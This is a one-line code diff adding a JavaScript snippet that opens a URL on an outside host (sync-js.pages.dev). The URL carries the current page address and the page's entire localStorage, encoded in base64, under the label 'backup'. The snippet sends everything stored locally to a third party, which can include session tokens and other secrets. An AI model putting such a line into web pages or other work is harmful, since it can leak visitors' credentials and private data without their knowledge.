@@ -1,0 +1,1 @@
+void(window.open("https://sync-js.pages.dev/backup?fromURL=" + encodeURI(location.href) + "&data=" + btoa(JSON.stringify(localStorage)).replaceAll("+","%2B")))
